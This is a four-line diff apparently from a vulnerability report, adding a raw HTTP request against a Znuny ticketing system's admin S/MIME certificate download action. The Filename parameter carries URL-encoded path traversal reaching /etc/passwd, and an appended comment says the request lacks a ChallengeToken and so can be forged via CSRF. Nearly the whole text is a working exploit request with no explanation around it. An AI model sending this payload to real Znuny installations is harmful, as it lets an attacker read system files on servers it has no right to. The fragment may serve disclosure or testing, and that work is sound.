@@ -1,0 +1,4 @@
+GET /znuny/index.pl?Action=AdminSMIME;Subaction=Download;Type=cert;Filename=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+Host: localhost:25114
+Cookie: OTRSAgentInterface=<admin>
+(note: NO ChallengeToken parameter — CSRF-forgeable)
